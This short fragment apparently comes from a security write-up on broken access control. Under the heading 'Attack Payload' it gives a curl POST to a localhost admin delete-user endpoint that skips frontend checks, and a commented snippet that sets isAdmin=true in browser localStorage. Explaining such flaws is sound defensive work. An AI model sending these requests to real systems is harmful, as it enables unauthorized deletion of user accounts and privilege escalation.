**Attack Payload**:
```bash
# Attacker directly calls admin endpoint, bypassing frontend checks
curl -X POST http://localhost:8080/api/admin/delete-user \
  -H "Content-Type: application/json" \
  -d '{"action": "delete", "userId": 42}'

# Or modify localStorage/cookies to set isAdmin=true in browser
# localStorage.setItem('user', JSON.stringify({...user, isAdmin: true}))
